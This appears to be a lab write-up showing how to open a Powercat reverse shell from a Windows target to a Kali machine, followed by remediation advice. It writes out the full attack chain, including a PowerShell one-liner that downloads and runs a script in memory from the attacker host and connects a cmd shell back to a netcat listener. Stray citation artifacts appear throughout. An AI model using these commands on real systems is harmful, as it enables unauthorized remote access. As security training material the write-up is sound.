# Powercat Reverse Shell

## Objective

Demonstrate how a reverse shell can be established between a Windows target and a Kali Linux attacker machine using Powercat and PowerShell.

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Tool Used: Powercat
- Communication Method: Reverse TCP Connection

## Powercat Setup

A dedicated directory was created and the Powercat script was downloaded from the official repository. :contentReference[oaicite:1]{index=1}

### Commands Used

```bash
mkdir Powercat
cd Powercat

wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

ls
```

### Findings

- Powercat script downloaded successfully.
- Powercat was prepared for execution.
- The attack environment was configured for reverse shell testing.

## HTTP Server Setup

A Python HTTP server was started on Kali Linux to host the Powercat script for download by the Windows target. :contentReference[oaicite:2]{index=2}

### Commands Used

```bash
python2 -m SimpleHTTPServer 80
```

### Findings

- HTTP server started successfully.
- Powercat script became accessible from the target machine.

## Listener Setup

A Netcat listener was configured on Kali Linux to receive the incoming reverse shell connection. :contentReference[oaicite:3]{index=3}

### Commands Used

```bash
nc -lvp 443
```

### Findings

- Listener started successfully.
- Kali Linux was ready to receive incoming connections.

## Reverse Shell Execution

Powercat was downloaded and executed directly in memory using PowerShell on the Windows target. :contentReference[oaicite:4]{index=4}

### Commands Used

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<Kali-IP>/powercat.ps1');powercat -c <Kali-IP> -p 443 -e cmd"
```

### Findings

- Powercat was loaded into memory.
- Reverse shell connection was established.
- Remote command execution was achieved.

## Remote Access Verification

The Kali Linux listener received the connection and provided access to the Windows command prompt. :contentReference[oaicite:5]{index=5}

### Verification

```cmd
whoami
```

### Findings

- Remote access to the target system was confirmed.
- Commands could be executed from the attacker machine.

## Security Impact

Powercat enables attackers to establish covert command execution channels and maintain access to compromised systems.

### Potential Risks

- Unauthorized remote access
- Command execution
- Persistence opportunities
- Lateral movement
- Data theft

## Remediation

- Restrict PowerShell execution where possible.
- Monitor suspicious PowerShell activity.
- Block unauthorized outbound connections.
- Implement application whitelisting.
- Use Endpoint Detection and Response (EDR) solutions.
- Enable PowerShell logging and monitoring.

## Tools Used

- Powercat
- PowerShell
- Netcat
- Python HTTP Server
- Kali Linux
- Windows 10

## Key Learning

This lab demonstrated how Powercat can be used to establish a reverse shell entirely through PowerShell, allowing remote command execution without requiring a traditional executable on disk.

The exercise reinforced concepts related to in-memory execution, post-exploitation techniques, and attacker-controlled communication channels.

## Disclaimer

This assessment was conducted in a controlled lab environment for educational and ethical security testing purposes only.